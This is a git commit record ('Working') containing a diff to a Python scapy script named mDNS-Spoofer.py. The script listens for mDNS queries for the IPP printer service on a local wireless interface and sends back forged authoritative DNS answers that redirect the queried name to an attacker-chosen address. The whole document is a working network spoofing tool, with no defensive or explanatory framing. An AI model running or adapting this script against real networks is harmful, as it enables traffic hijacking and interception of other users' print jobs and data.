01cc9eaef15c83bff9e7cd683a75696906d7baec
Rucker <russ22223@gmail.com>
2021-03-23 22:50:36 +0000

    Working

--- mDNS-Spoofer.py
+++ mDNS-Spoofer.py
@@ -1,34 +1,64 @@
 from scapy.all import *
 import os
 
+# Тут нужно добавлять точку в конце
+dns_to_spoof = '_ipp._tcp.local.'
 redirect_to = '1.1.1.1'
-interface = 'tun0'
+interface = 'wlp2s0'
 
-def callback(pkt):
+def callback(packet):
 
-  pkt.show()
-  
-  if (pkt.haslayer(DNSRR) and (pkt[DNSRR][0].rdata != redirect_to) and (pkt[DNSQR][0].qtype == 1)): # DNS question record
+  # pkt.show()
+  if (packet[DNSQR].qname.decode("utf-8") == dns_to_spoof): # DNS question record
 
-        pkt.show()
+        packet.show()
         print('----------------------------------------------')
 
-        pkt[DNSRR][0].rdata = redirect_to
+        # Construct the DNS packet
+        # Construct the Ethernet header by looking at the sniffed packet
+        eth = Ether(
+            src=get_if_hwaddr(interface),
+            dst=packet[Ether].src
+            )
 
-        # Recalculation checksum and length 
-        pkt[UDP].chksum = in4_chksum(socket.IPPROTO_UDP, pkt[UDP], raw(pkt[UDP]))
-        pkt[UDP].len = len(raw(pkt[UDP]))
-        
-        pkt[IP].chksum = in4_chksum(socket.IPPROTO_IP, pkt[IP], raw(pkt[IP]))
-        pkt[IP].len = len(raw(pkt[IP]))
+        # Construct the IP header by looking at the sniffed packet
+        ip = IP(
+            src=get_if_addr(interface),
+            dst=packet[IP].src
+            )
 
-        # print('----------------------------------------------')
-        pkt.show()
+        # Construct the UDP header by looking at the sniffed packet
+        udp = UDP(
+            dport=packet[UDP].sport,
+            sport=packet[UDP].dport
+            )
+
+        # Construct the DNS response by looking at the sniffed packet and manually
+        dns = DNS(
+            id=packet[DNS].id,
+            qd=packet[DNS].qd,
+            aa=1,
+            rd=0,
+            qr=1,
+            qdcount=1,
+            ancount=1,
+            nscount=0,
+            arcount=0,
+            ar=DNSRR(
+                rrname=packet[DNS].qd.qname,
+                type='A',
+                ttl=600,
+                rdata=redirect_to)
+            )
+
+        # Put the full packet together
+        spoofed_pkt = eth / ip / udp / dns
+
+        print('----------------------------------------------')
+        spoofed_pkt.show()
                 
-        packet.set_payload(str(pkt)) #set the packet content to our modified version
-
-        packet.accept() #accept the packet
-        # sendp(spoofed_pkt, iface='wlp2s0')
-        print ('Sent:', pkt.summary())
+        sendp(spoofed_pkt, iface=interface)
+        print ('Sent:', packet.summary())
+        exit()
 
 sniff(filter='udp and port 5353', iface=interface, store=0, prn=callback)
